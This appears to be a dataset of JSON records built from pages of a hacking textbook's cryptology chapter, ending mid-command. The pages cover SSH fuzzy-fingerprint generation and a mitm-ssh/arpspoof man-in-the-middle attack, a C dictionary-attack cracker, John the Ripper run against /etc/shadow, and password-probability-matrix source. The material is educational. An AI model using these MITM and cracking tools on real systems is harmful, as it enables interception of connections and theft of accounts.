version information\nNo state file /var/tmp/ffp.state present, specify a target hash.\nreader@hacking:~ $ ffp -f md5 -k rsa -b 1024 -t ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\n---[Initializing]---------------------------------------------------------------\nInitializing Crunch Hash: Done\nInitializing Fuzzy Map: Done\nInitializing Private Key: Done\nInitializing Hash List: Done\nInitializing FFP State: Done\n414 0x700\n---[Fuzzy Map]------------------------------------------------------------------\nLength: 32\nType: Inverse Gaussian Distribution\nSum: 15020328\nFuzzy Map: 10.83% | 9.64% : 8.52% | 7.47% : 6.49% | 5.58% : 4.74% | 3.96% :\n3.25% | 2.62% : 2.05% | 1.55% : 1.12% | 0.76% : 0.47% | 0.24% :\n0.09% | 0.01% : 0.00% | 0.06% : 0.19% | 0.38% : 0.65% | 0.99% :\n1.39% | 1.87% : 2.41% | 3.03% : 3.71% | 4.46% : 5.29% | 6.18% :\n---[Current Key]----------------------------------------------------------------\nKey Algorithm: RSA (Rivest Shamir Adleman)\nKey Bits / Size of n: 1024 Bits\nPublic key e: 0x10001\nPublic Key Bits / Size of e: 17 Bits\nPhi(n) and e r.prime: Yes\nGeneration Mode: Sloppy\nState File: /var/tmp/ffp.state\nRunning...\n---[Current State]--------------------------------------------------------------\nRunning: 0d 00h 00m 00s | Total: 0k hashs | Speed: nan hashs/s\n--------------------------------------------------------------------------------\nBest Fuzzy Fingerprint from State File /var/tmp/ffp.state\nHash Algorithm: Message Digest 5 (MD5)\nDigest Size: 16 Bytes / 128 Bits\nMessage Digest: 6a:06:f9:a6:cf:09:19:af:c3:9d:c5:b9:91:a4:8d:81\nTarget Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\nFuzzy Quality: 25.652482%\n---[Current State]--------------------------------------------------------------\nRunning: 0d 00h 01m 00s | Total: 7635k hashs | Speed: 127242 hashs/s\n--------------------------------------------------------------------------------\nBest Fuzzy Fingerprint from State File /var/tmp/ffp.state\nHash Algorithm: Message Digest 5 (MD5)\nDigest Size: 16 Bytes / 128 Bits\nMessage Digest: ba:06:3a:8c:bc:73:24:64:5b:8a:6d:fa:a6:1c:09:80\nTarget Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\nFuzzy Quality: 55.471931%\n---[Current State]--------------------------------------------------------------\nRunning: 0d 00h 02m 00s | Total: 15370k hashs | Speed: 128082 hashs/s\n--------------------------------------------------------------------------------\nBest Fuzzy Fingerprint from State File /var/tmp/ffp.state\nHash Algorithm: Message Digest 5 (MD5)\nDigest Size: 16 Bytes / 128 Bits\nMessage Digest: ba:06:3a:8c:bc:73:24:64:5b:8a:6d:fa:a6:1c:09:80\nTarget Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\nFuzzy Quality: 55.471931%\n.:[ output trimmed ]:.\nCryptology 415\n---[Current State]--------------------------------------------------------------\nRunning: 1d 05h 06m 00s | Total: 13266446k hashs | Speed: 126637 hashs/s\n--------------------------------------------------------------------------------\nBest Fuzzy Fingerprint from State File /var/tmp/ffp.state\nHash Algorithm: Message Digest 5 (MD5)\nDigest Size: 16 Bytes / 128 Bits\nMessage Digest: ba:0d:7f:d2:64:76:b8:9c:f1:22:22:87:b0:26:59:50\nTarget Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\nFuzzy Quality: 70.158321%\n--------------------------------------------------------------------------------\nExiting and saving state file /var/tmp/ffp.state\nreader@hacking:~ $\nThis fuzzy fingerprint generation process can go on for as long as desired.\nThe program keeps track of some of the best fingerprints and will display them\nperiodically. All of the state information is stored in /var/tmp/ffp.state, so the\nprogram can be exited with a CTRL-C and then resumed again later by simply\nrunning ffp without any arguments.\nAfter running for a while, SSH host key pairs can be extracted from the\nstate file with the -e switch.\nreader@hacking:~ $ ffp -e -d /tmp\n---[Restoring]------------------------------------------------------------------\nReading FFP State File: Done\nRestoring environment: Done\nInitializing Crunch Hash: Done\n--------------------------------------------------------------------------------\nSaving SSH host key pairs: [00] [01] [02] [03] [04] [05] [06] [07] [08] [09]\nreader@hacking:~ $ ls /tmp/ssh-rsa*\n/tmp/ssh-rsa00 /tmp/ssh-rsa02.pub /tmp/ssh-rsa05 /tmp/ssh-rsa07.pub\n/tmp/ssh-rsa00.pub /tmp/ssh-rsa03 /tmp/ssh-rsa05.pub /tmp/ssh-rsa08\n/tmp/ssh-rsa01 /tmp/ssh-rsa03.pub /tmp/ssh-rsa06 /tmp/ssh-rsa08.pub\n/tmp/ssh-rsa01.pub /tmp/ssh-rsa04 /tmp/ssh-rsa06.pub /tmp/ssh-rsa09\n/tmp/ssh-rsa02 /tmp/ssh-rsa04.pub /tmp/ssh-rsa07 /tmp/ssh-rsa09.pub\nreader@hacking:~ $\nIn the preceding example, 10 public and private host key pairs have\nbeen generated. Fingerprints for these key pairs can then be generated and\ncompared with the original fingerprint, as seen in the following output.\nreader@hacking:~ $ for i in $(ls -1 /tmp/ssh-rsa*.pub)\n> do\n> ssh-keygen -l -f $i\n> done\n1024 ba:0d:7f:d2:64:76:b8:9c:f1:22:22:87:b0:26:59:50 /tmp/ssh-rsa00.pub\n1024 ba:06:7f:12:bd:8a:5b:5c:eb:dd:93:ec:ec:d3:89:a9 /tmp/ssh-rsa01.pub\n1024 ba:06:7e:b2:64:13:cf:0f:a4:69:17:d0:60:62:69:a0 /tmp/ssh-rsa02.pub\n1024 ba:06:49:d4:b9:d4:96:4b:93:e8:5d:00:bd:99:53:a0 /tmp/ssh-rsa03.pub\n416 0x700\n1024 ba:06:7c:d2:15:a2:d3:0d:bf:f0:d4:5d:c6:10:22:90 /tmp/ssh-rsa04.pub\n1024 ba:06:3f:22:1b:44:7b:db:41:27:54:ac:4a:10:29:e0 /tmp/ssh-rsa05.pub\n1024 ba:06:78:dc:be:a6:43:15:eb:3f:ac:92:e5:8e:c9:50 /tmp/ssh-rsa06.pub\n1024 ba:06:7f:da:ae:61:58:aa:eb:55:d0:0c:f6:13:61:30 /tmp/ssh-rsa07.pub\n1024 ba:06:7d:e8:94:ad:eb:95:d2:c5:1e:6d:19:53:59:a0 /tmp/ssh-rsa08.pub\n1024 ba:06:74:a2:c2:8b:a4:92:e1:e1:75:f5:19:15:60:a0 /tmp/ssh-rsa09.pub\nreader@hacking:~ $ ssh-keygen -l -f ./loki.hostkey\n1024 ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 192.168.42.72\nreader@hacking:~ $\nFrom the 10 generated key pairs, the one that seems to look the most\nsimilar can be determined by eye. In this case, ssh-rsa02.pub, shown in bold,\nwas chosen. Regardless of which key pair is chosen, though, it will certainly\nlook more like the original fingerprint than any randomly generated key\nwould.\nThis new key can be used with mitm-ssh to make for an even more\neffective attack. The location for the host key is specified in the config-\nuration file, so using the new key is simply matter of adding a HostKey line\nin/usr/local/etc/mitm-ssh_config, as shown below. Since we need to remove\nthe Protocol 1 line we added earlier, the output below simply overwrites the\nconfiguration file.\nreader@hacking:~ $ echo \"HostKey /tmp/ssh-rsa02\" > /usr/local/etc/mitm-ssh_config\nreader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222Using static route to 192.168.42.72:22\nDisabling protocol version 1. Could not load host key\nSSH MITM Server listening on 0.0.0.0 port 2222.\nIn another terminal window, arpspoof is running to redirect the traffic\nto mitm-ssh, which will use the new host key with the fuzzy fingerprint. The\noutput below compares the output a client would see when connecting.\nNormal Connection\niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nAre you sure you want to continue connecting (yes/no)?\nMitM-Attacked Connection\niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7e:b2:64:13:cf:0f:a4:69:17:d0:60:62:69:a0.\nAre you sure you want to continue connecting (yes/no)?\nCan you immediately tell the difference? These fingerprints look similar\nenough to trick most people into simply accepting the connection.\nCryptology 417"
  },
  {
    "input": "0x760 Password Cracking",
    "output": "0x760 Password Cracking\nPasswords aren’t generally stored in plaintext form. A file containing all\nthe passwords in plaintext form would be far too attractive a target, so\ninstead, a one-way hash function is used. The best-known of these functions\nisbased on DES and is called crypt(), which is described in the manual\npage shown below.\nNAME\ncrypt - password and data encryption\nSYNOPSIS\n#define _XOPEN_SOURCE\n#include <unistd.h>\nchar *crypt(const char *key, const char *salt);\nDESCRIPTION\ncrypt() is the password encryption function. It is based on the Data\nEncryption Standard algorithm with variations intended (among other\nthings) to discourage use of hardware implementations of a key search.\nkey is a user's typed password.\nsalt is a two-character string chosen from the set [a–zA–Z0–9./]. This\nstring is used to perturb the algorithm in one of 4096 different ways.\nThis is a one-way hash function that expects a plaintext password and a\nsalt value for input, and then outputs a hash with the salt value prepended\nto it. This hash is mathematically irreversible, meaning that it is impossible to\ndetermine the original password using only the hash. Writing a quick program\nto experiment with this function will help clarify any confusion.\ncrypt_test.c\n#define _XOPEN_SOURCE\n#include <unistd.h>\n#include <stdio.h>\nint main(int argc, char *argv[]) {\nif(argc < 2) {\nprintf(\"Usage: %s <plaintext password> <salt value>\\n\", argv[0]);\nexit(1);\n}\nprintf(\"password \\\"%s\\\" with salt \\\"%s\\\" \", argv[1], argv[2]);\nprintf(\"hashes to ==> %s\\n\", crypt(argv[1], argv[2]));\n}\nWhen this program is compiled, the crypt library needs to be linked.\nThis is shown in the following output, along with some test runs.\n418 0x700"
  },
  {
    "input": "0x761 Dictionary Attacks",
    "output": "reader@hacking:~/booksrc $ gcc -o crypt_test crypt_test.c\n/tmp/cccrSvYU.o: In function `main':\ncrypt_test.c:(.text+0x73): undefined reference to `crypt'\ncollect2: ld returned 1 exit status\nreader@hacking:~/booksrc $ gcc -o crypt_test crypt_test.c -l crypt\nreader@hacking:~/booksrc $ ./crypt_test testing je\npassword \"testing\" with salt \"je\" hashes to ==> jeLu9ckBgvgX.\nreader@hacking:~/booksrc $ ./crypt_test test je\npassword \"test\" with salt \"je\" hashes to ==> jeHEAX1m66RV.\nreader@hacking:~/booksrc $ ./crypt_test test xy\npassword \"test\" with salt \"xy\" hashes to ==> xyVSuHLjceD92\nreader@hacking:~/booksrc $\nNotice that in the last two runs, the same password is encrypted, but\nusing different salt values. The salt value is used to perturb the algorithm\nfurther, so there can be multiple hash values for the same plaintext value if\ndifferent salt values are used. The hash value (including the prepended salt)\nis stored in the password file under the premise that if an attacker were to\nsteal the password file, the hashes would be useless.\nWhen a legitimate user needs to authenticate using the password hash,\nthat user’s hash is looked up in the password file. The user is prompted to\nenter her password, the original salt value is extracted from the password file,\nand whatever the user types is sent through the same one-way hash function\nwith the salt value. If the correct password was entered, the one-way hashing\nfunction will produce the same hash output as is stored in the password file.\nThis allows authentication to function as expected, without ever having to\nstore the plaintext password.\n0x761 Dictionary Attacks\nIt turns out, however, that the encrypted passwords in the password file aren’t\nso useless after all. Sure, it’s mathematically impossible to reverse the hash,\nbut it is possible to just quickly hash every word in a dictionary, using the salt\nvalue for a specific hash, and then compare the result with that hash. If the\nhashes match, then that word from the dictionary must be the plaintext\npassword.\nA simple dictionary attack program can be whipped up fairly easily. It just\nneeds to read words from a file, hash each one using the proper salt value,\nand display the word if there is a match. The following source code does this\nusing filestream functions, which are included with stdio.h. These functions\nare easier to work with, since they wrap up the messiness of open() calls and\nfile descriptors, using FILE structure pointers, instead. In the source below,\nthe fopen() call’s r argument tells it to open the file for reading. It returns\nNULL on failure, or a pointer to the open filestream. The fgets() call gets\nastring from the filestream, up to a maximum length or when it reaches the\nend of a line. In this case, it’s used to read each line from the word-list file.\nThis function also returns NULL on failure, which is used to detect then\nendof the file.\nCryptology 419\ncrypt_crack.c\n#define _XOPEN_SOURCE\n#include <unistd.h>\n#include <stdio.h>\n/* Barf a message and exit. */\nvoid barf(char *message, char *extra) {\nprintf(message, extra);\nexit(1);\n}\n/* A dictionary attack example program */\nint main(int argc, char *argv[]) {\nFILE *wordlist;\nchar *hash, word[30], salt[3];\nif(argc < 2)\nbarf(\"Usage: %s <wordlist file> <password hash>\\n\", argv[0]);\nstrncpy(salt, argv[2], 2); // First 2 bytes of hash are the salt.\nsalt[2] = '\\0'; // terminate string\nprintf(\"Salt value is \\'%s\\'\\n\", salt);\nif( (wordlist = fopen(argv[1], \"r\")) == NULL) // Open the wordlist.\nbarf(\"Fatal: couldn't open the file \\'%s\\'.\\n\", argv[1]);\nwhile(fgets(word, 30, wordlist) != NULL) { // Read each word\nword[strlen(word)-1] = '\\0'; // Remove the '\\n' byte at the end.\nhash = crypt(word, salt); // Hash the word using the salt.\nprintf(\"trying word: %-30s ==> %15s\\n\", word, hash);\nif(strcmp(hash, argv[2]) == 0) { // If the hash matches\nprintf(\"The hash \\\"%s\\\" is from the \", argv[2]);\nprintf(\"plaintext password \\\"%s\\\".\\n\", word);\nfclose(wordlist);\nexit(0);\n}\n}\nprintf(\"Couldn't find the plaintext password in the supplied wordlist.\\n\");\nfclose(wordlist);\n}\nThe following output shows this program being used to crack the pass-\nword hash jeHEAX1m66RV., using the words found in /usr/share/dict/words.\nreader@hacking:~/booksrc $ gcc -o crypt_crack crypt_crack.c -lcrypt\nreader@hacking:~/booksrc $ ./crypt_crack /usr/share/dict/words jeHEAX1m66RV.\nSalt value is 'je'\ntrying word: ==> jesS3DmkteZYk\ntrying word: A ==> jeV7uK/S.y/KU\ntrying word: A's ==> jeEcn7sF7jwWU\ntrying word: AOL ==> jeSFGex8ANJDE\ntrying word: AOL's ==> jesSDhacNYUbc\n420 0x700\ntrying word: Aachen ==> jeyQc3uB14q1E\ntrying word: Aachen's ==> je7AQSxfhvsyM\ntrying word: Aaliyah ==> je/vAqRJyOZvU\n.:[ output trimmed ]:.\ntrying word: terse ==> jelgEmNGLflJ2\ntrying word: tersely ==> jeYfo1aImUWqg\ntrying word: terseness ==> jedH11z6kkEaA\ntrying word: terseness's ==> jedH11z6kkEaA\ntrying word: terser ==> jeXptBe6psF3g\ntrying word: tersest ==> jenhzylhDIqBA\ntrying word: tertiary ==> jex6uKY9AJDto\ntrying word: test ==> jeHEAX1m66RV.\nThe hash \"jeHEAX1m66RV.\" is from the plaintext password \"test\".\nreader@hacking:~/booksrc $\nSince the word test was the original password and this word is found in\nthe words file, the password hash will eventually be cracked. This is why it’s\nconsidered poor security practice to use passwords that are dictionary words\nor based on dictionary words.\nThe downside to this attack is that if the original password isn’t a word\nfound in the dictionary file, the password won’t be found. For example, if a\nnon-dictionary word such as h4R% is used as a password, the dictionary attack\nwon’t be able to find it:\nreader@hacking:~/booksrc $ ./crypt_test h4R% je\npassword \"h4R%\" with salt \"je\" hashes to ==> jeMqqfIfPNNTE\nreader@hacking:~/booksrc $ ./crypt_crack /usr/share/dict/words jeMqqfIfPNNTE\nSalt value is 'je'\ntrying word: ==> jesS3DmkteZYk\ntrying word: A ==> jeV7uK/S.y/KU\ntrying word: A's ==> jeEcn7sF7jwWU\ntrying word: AOL ==> jeSFGex8ANJDE\ntrying word: AOL's ==> jesSDhacNYUbc\ntrying word: Aachen ==> jeyQc3uB14q1E\ntrying word: Aachen's ==> je7AQSxfhvsyM\ntrying word: Aaliyah ==> je/vAqRJyOZvU\n.:[ output trimmed ]:.\ntrying word: zooms ==> je8A6DQ87wHHI\ntrying word: zoos ==> jePmCz9ZNPwKU\ntrying word: zucchini ==> jeqZ9LSWt.esI\ntrying word: zucchini's ==> jeqZ9LSWt.esI\ntrying word: zucchinis ==> jeqZ9LSWt.esI\ntrying word: zwieback ==> jezzR3b5zwlys\ntrying word: zwieback's ==> jezzR3b5zwlys\ntrying word: zygote ==> jei5HG7JrfLy6\ntrying word: zygote's ==> jej86M9AG0yj2\ntrying word: zygotes ==> jeWHQebUlxTmo\nCouldn't find the plaintext password in the supplied wordlist.\nCryptology 421"
  },
  {
    "input": "0x762 Exhaustive Brute-Force Attacks",
    "output": "Custom dictionary files are often made using different languages, standard\nmodifications of words (such as transforming letters to numbers), or simply\nappending numbers to the end of each word. While a bigger dictionary will\nyield more passwords, it will also take more time to process.\n0x762 Exhaustive Brute-Force Attacks\nA dictionary attack that tries every single possible combination is an exhaustive\nbrute-force attack. While this type of attack will technically be able to crack\nevery conceivable password, it will probably take longer than your grand-\nchildren’s grandchildren would be willing to wait.\nWith 95 possible input characters for crypt()-style passwords, there\nare958 possible passwords for an exhaustive search of all eight-character\npasswords, which works out to be over seven quadrillion possible passwords.\nThis number gets so big so quickly because, as another character is added to\nthe password length, the number of possible passwords grows exponentially.\nAssuming 10,000 cracks per second, it would take about 22,875 years to try\nevery password. Distributing this effort across many machines and processors\nis one possible approach; however, it is important to remember that this will\nonly achieve a linear speedup. If one thousand machines were combined,\neach capable of 10,000 cracks per second, the effort would still take over 22\nyears. The linear speedup achieved by adding another machine is marginal\ncompared to the growth in keyspace when another character is added to the\npassword length.\nLuckily, the inverse of the exponential growth is also true; as characters\nare removed from the password length, the number of possible passwords\ndecreases exponentially. This means that a four-character password only has\n954 possible passwords. This keyspace has only about 84 million possible pass-\nwords, which can be exhaustively cracked (assuming 10,000 cracks per second)\nin a little over two hours. This means that, even though a password like h4R%\nisn’t in any dictionary, it can be cracked in a reasonable amount of time.\nThis means that, in addition to avoiding dictionary words, password length\nis also important. Since the complexity scales up exponentially, doubling the\nlength to produce an eight-character password should bring the level of effort\nrequired to crack the password into the unreasonable time frame.\nSolar Designer has developed a password-cracking program called John\nthe Ripper that uses first a dictionary attack and then an exhaustive brute-\nforce attack. This program is probably the most popular one of its kind;\nitisavailable at http://www.openwall.com/john. It has been included on\nthe LiveCD.\nreader@hacking:~/booksrc $ john\nJohn the Ripper Version 1.6 Copyright (c) 1996-98 by Solar Designer\nUsage: john [OPTIONS] [PASSWORD-FILES]\n-single \"single crack\" mode\n-wordfile:FILE -stdin wordlist mode, read words from FILE or stdin\n-rules enable rules for wordlist mode\n422 0x700"
  },
  {
    "input": "0x763 Hash Lookup Table",
    "output": "-incremental[:MODE] incremental mode [using section MODE]\n-external:MODE external mode or word filter\n-stdout[:LENGTH] no cracking, just write words to stdout\n-restore[:FILE] restore an interrupted session [from FILE]\n-session:FILE set session file name to FILE\n-status[:FILE] print status of a session [from FILE]\n-makechars:FILE make a charset, FILE will be overwritten\n-show show cracked passwords\n-test perform a benchmark\n-users:[-]LOGIN|UID[,..] load this (these) user(s) only\n-groups:[-]GID[,..] load users of this (these) group(s) only\n-shells:[-]SHELL[,..] load users with this (these) shell(s) only\n-salts:[-]COUNT load salts with at least COUNT passwords only\n-format:NAME force ciphertext format NAME (DES/BSDI/MD5/BF/AFS/LM)\n-savemem:LEVEL enable memory saving, at LEVEL 1..3\nreader@hacking:~/booksrc $ sudo tail -3 /etc/shadow\nmatrix:$1$zCcRXVsm$GdpHxqC9epMrdQcayUx0//:13763:0:99999:7:::\njose:$1$pRS4.I8m$Zy5of8AtD800SeMgm.2Yg.:13786:0:99999:7:::\nreader:U6aMy0wojraho:13764:0:99999:7:::\nreader@hacking:~/booksrc $ sudo john /etc/shadow\nLoaded 2 passwords with 2 different salts (FreeBSD MD5 [32/32])\nguesses: 0 time: 0:00:00:01 0% (2) c/s: 5522 trying: koko\nguesses: 0 time: 0:00:00:03 6% (2) c/s: 5489 trying: exports\nguesses: 0 time: 0:00:00:05 10% (2) c/s: 5561 trying: catcat\nguesses: 0 time: 0:00:00:09 20% (2) c/s: 5514 trying: dilbert!\nguesses: 0 time: 0:00:00:10 22% (2) c/s: 5513 trying: redrum3\ntesting7 (jose)\nguesses: 1 time: 0:00:00:14 44% (2) c/s: 5539 trying: KnightKnight\nguesses: 1 time: 0:00:00:17 59% (2) c/s: 5572 trying: Gofish!\nSession aborted\nIn this output, the account jose is shown to have the password of testing7.\n0x763 Hash Lookup Table\nAnother interesting idea for password cracking is using a giant hash lookup\ntable. If all the hashes for all possible passwords were precomputed and stored\nin a searchable data structure somewhere, any password could be cracked\ninthe time it takes to search. Assuming a binary search, this time would be\nabout O(log N), where N is the number of entries. Since N is 958 in the case\n2\nof eight-character passwords, this works out to about O(8 log 95), which is\n2\nquite fast.\nHowever, a hash lookup table like this would require about 100,000 tera-\nbytes of storage. In addition, the design of the password-hashing algorithm\ntakes this type of attack into consideration and mitigates itwith the salt value.\nSince multiple plaintext passwords will hash to different password hashes with\ndifferent salts, a separate lookup table would have to be created for each salt.\nWith the DES-based crypt() function, there are 4,096 possible salt values, which\nmeans that even for a smaller keyspace, such as all possible four-character\npasswords, a hash lookup table becomes impractical. With a fixed salt, the\nstorage space needed for a single lookup table for all possible four-character\npasswords is about one gigabyte, but because of the salt values, there are 4,096\nCryptology 423"
  },
  {
    "input": "0x764 Password Probability Matrix",
    "output": "possible hashes for a single plaintext password, necessitating 4,096 different\ntables. This raises the needed storage space up to about 4.6 terabytes, which\ngreatly dissuades such an attack.\n0x764 Password Probability Matrix\nThere is a trade-off between computational power and storage space that\nexists everywhere. This can be seen in the most elementary forms of computer\nscience and everyday life. MP3 files use compression to store a high-quality\nsound file in a relatively small amount of space, but the demand for compu-\ntational resources increases. Pocket calculators use this trade-off in the other\ndirection by maintaining a lookup table for functions such as sine and cosine\nto save the calculator from doing heavy computations.\nThis trade-off can also be applied to cryptography in what has become\nknown as a time/space trade-off attack. While Hellman’s methods for this\ntype of attack are probably more efficient, the following source code should\nbe easier to understand. The general principle is always the same, though:\nTry to find the sweet spot between computational power and storage space,\nso that an exhaustive brute-force attack can be completed in a reasonable\namount of time, using a reasonable amount of space. Unfortunately, the\ndilemma of salts will still present itself, since this method still requires some\nform of storage. However, there are only 4,096 possible salts with crypt()-style\npassword hashes, so the effect of this problem can be diminished by reducing\nthe needed storage space far enough to remain reasonable despite the 4,096\nmultiplier.\nThis method uses a form of lossy compression. Instead of having an\nexact hash lookup table, several thousand possible plaintext values will be\nreturned when a password hash is entered. These values can be checked\nquickly to converge on the original plaintext password, and the lossy com-\npression allows for a major space reduction. In the demonstration code that\nfollows, the keyspace for all possible four-character passwords (with a fixed\nsalt) is used. The storage space needed is reduced by 88 percent, compared\ntoa full hash lookup table (with a fixed salt), and the keyspace that must be\nbrute-forced through is reduced by about 1,018 times. Under the assumption\nof 10,000 cracks per second, this method can crack any four-character pass-\nword (with a fixed salt) in under eight seconds, which is a considerable\nspeedup when compared to the two hours needed for an exhaustive brute-\nforce attack of the same keyspace.\nThis method builds a three-dimensional binary matrix that correlates\nparts of the hash values with parts of the plaintext values. On the x-axis, the\nplaintext is split into two pairs: the first two characters and the second two\ncharacters. The possible values are enumerated into a binary vector that is\n952, or 9,025, bits long (about 1,129 bytes). On the y-axis, the ciphertext is\nsplit into four three-character chunks. These are enumerated the same way\ndown the columns, but only four bits of the third character are actually used.\nThis means there are 642 · 4, or 16,384, columns. The z-axis exists simply to\nmaintain eight different two-dimensional matrices, so four exist for each of\nthe plaintext pairs.\n424 0x700\nThe basic idea is to split the plaintext into two paired values that are\nenumerated along a vector. Every possible plaintext is hashed into ciphertext,\nand the ciphertext is used to find the appropriate column of the matrix.\nThen the plaintext enumeration bit across the row of the matrix is turned\non. When the ciphertext values are reduced into smaller chunks, collisions\nare inevitable.\nPlaintext Hash\ntest jeHEAX1m66RV.\n!J)h jeHEA38vqlkkQ\n\".F+ jeHEA1Tbde5FE\n\"8,J jeHEAnX8kQK3I\nIn this case, the column for HEA would have the bits corresponding to the\nplaintext pairs te, !J, \"., and \"8 turned on, as these plaintext/hash pairs are\nadded to the matrix.\nAfter the matrix is completely filled out, when a hash such as jeHEA38vqlkkQ\nis entered, the column for HEA will be looked up, and the two-dimensional\nmatrix will return the values te, !J, \"., and \"8 for the first two characters of\nthe plaintext. There are four matrices like this for the first two characters,\nusing ciphertext substring from characters 2 through 4, 4 through 6, 6 though\n8, and 8 though 10, each with a different vector of possible first two-character\nplaintext values. Each vector is pulled, and they are combined with a bitwise\nAND. This will leave only those bits turned on that correspond to the plaintext\npairs listed as possibilities for each substring of ciphertext. There are also\nfour matrices like this for the last two characters of plaintext.\nThe sizes of the matrices were determined by the pigeonhole principle.\nThis is a simple principle that states: If k + 1 objects are put into k boxes, at\nleast one of the boxes will contain two objects. So, to get the best results, the\ngoal is for each vector to be a little bit less than half full of 1s. Since 954, or\n81,450,625, entries will be put in the matrices, there need to be about twice\nas many holes to achieve 50 percent saturation. Since each vector has 9,025\nentries, there should be about (954 · 2) / 9025 columns. This works out to be\nabout 18,000 columns. Since ciphertext substrings of three characters are\nbeing used for the columns, the first two characters and four bits from the\nthird character are used to provide 642 · 4, or about 16 thousand columns\n(there are only 64 possible values for each character of ciphertext hash).\nThis should be close enough, because when a bit is added twice, the overlap\nis ignored. In practice, each vector turns out to be about 42 percent saturated\nwith 1s.\nSince there are four vectors that are pulled for a single ciphertext, the\nprobability of any one enumeration position having a 1 value in each vector\nis about 0.424, or about 3.11 percent. This means that, on average, the 9,025\npossibilities for the first two characters of plaintext are reduced by about 97\npercent to 280 possibilities. This is also done for the last two characters, pro-\nviding about 2802, or 78,400, possible plaintext values. Under the assumption\nof 10,000 cracks per second, this reduced keyspace would take under 8 seconds\nto check.\nCryptology 425\nOf course, there are downsides. First, it takes at least as long to create the\nmatrix as the original brute-force attack would have taken; however, this is a\none-time cost. Also, the salts still tend to prohibit any type of storage attack,\neven with the reduced storage-space requirements.\nThe following two source code listings can be used to create a password\nprobability matrix and crack passwords with it. The first listing will generate a\nmatrix that can be used to crack all possible four-character passwords salted\nwith je. The second listing will use the generated matrix to actually do the\npassword cracking.\nppm_gen.c\n/*********************************************************\\\n* Password Probability Matrix * File: ppm_gen.c *\n***********************************************************\n* *\n* Author: Jon Erickson <matrix@phiral.com> *\n* Organization: Phiral Research Laboratories *\n* *\n* This is the generate program for the PPM proof of *\n* concept. It generates a file called 4char.ppm, which *\n* contains information regarding all possible 4- *\n* character passwords salted with 'je'. This file can *\n* be used to quickly crack passwords found within this *\n* keyspace with the corresponding ppm_crack.c program. *\n* *\n\\*********************************************************/\n#define _XOPEN_SOURCE\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#define HEIGHT 16384\n#define WIDTH 1129\n#define DEPTH 8\n#define SIZE HEIGHT * WIDTH * DEPTH\n/* Map a single hash byte to an enumerated value. */\nint enum_hashbyte(char a) {\nint i, j;\ni = (int)a;\nif((i >= 46) && (i <= 57))\nj = i - 46;\nelse if ((i >= 65) && (i <= 90))\nj = i - 53;\nelse if ((i >= 97) && (i <= 122))\nj = i - 59;\nreturn j;\n}\n/* Map 3 hash bytes to an enumerated value. */\nint enum_hashtriplet(char a, char b, char c) {\n426 0x700\nreturn (((enum_hashbyte(c)%4)*4096)+(enum_hashbyte(a)*64)+enum_hashbyte(b));\n}\n/* Barf a message and exit. */\nvoid barf(char *message, char *extra) {\nprintf(message, extra);\nexit(1);\n}\n/* Generate a 4–char.ppm file with all possible 4-char passwords (salted w/ je). */\nint main() {\nchar plain[5];\nchar *code, *data;\nint i, j, k, l;\nunsigned int charval, val;\nFILE *handle;\nif (!(handle = fopen(\"4char.ppm\", \"w\")))\nbarf(\"Error: Couldn't open file '4char.ppm' for writing.\\n\", NULL);\ndata = (char *) malloc(SIZE);\nif (!(data))\nbarf(\"Error: Couldn't allocate memory.\\n\", NULL);\nfor(i=32; i<127; i++) {\nfor(j=32; j<127; j++) {\nprintf(\"Adding %c%c** to 4char.ppm..\\n\", i, j);\nfor(k=32; k<127; k++) {\nfor(l=32; l<127; l++) {\nplain[0] = (char)i; // Build every\nplain[1] = (char)j; // possible 4-byte\nplain[2] = (char)k; // password.\nplain[3] = (char)l;\nplain[4] = '\\0';\ncode = crypt((const char *)plain, (const char *)\"je\"); // Hash it.\n/* Lossfully store statistical info about the pairings. */\nval = enum_hashtriplet(code[2], code[3], code[4]); // Store info about bytes 2-4.\ncharval = (i-32)*95 + (j-32); // First 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |= (1<<(charval%8));\nval += (HEIGHT * 4);\ncharval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |= (1<<(charval%8));\nval = HEIGHT + enum_hashtriplet(code[4], code[5], code[6]); // bytes 4-6\ncharval = (i-32)*95 + (j-32); // First 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |= (1<<(charval%8));\nval += (HEIGHT * 4);\ncharval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |= (1<<(charval%8));\nval = (2 * HEIGHT) + enum_hashtriplet(code[6], code[7], code[8]); // bytes 6-8\ncharval = (i-32)*95 + (j-32); // First 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |= (1<<(charval%8));\nval += (HEIGHT * 4);\nCryptology 427\ncharval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |= (1<<(charval%8));\nval = (3 * HEIGHT) + enum_hashtriplet(code[8], code[9], code[10]); // bytes 8-10\ncharval = (i-32)*95 + (j-32); // First 2 plaintext chars\ndata[(val*WIDTH)+(charval/8)] |= (1<<(charval%8));\nval += (HEIGHT * 4);\ncharval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\ndata[(val*WIDTH)+(charval/8)] |= (1<<(charval%8));\n}\n}\n}\n}\nprintf(\"finished.. saving..\\n\");\nfwrite(data, SIZE, 1, handle);\nfree(data);\nfclose(handle);\n}\nThe first piece of code, ppm_gen.c, can be used to generate a four-\ncharacter password probability matrix, as shown in the output below. The\n-O3option passed to GCC tells it to optimize the code for speed when it\ncompiles.\nreader@hacking:~/booksrc $ gcc -O3 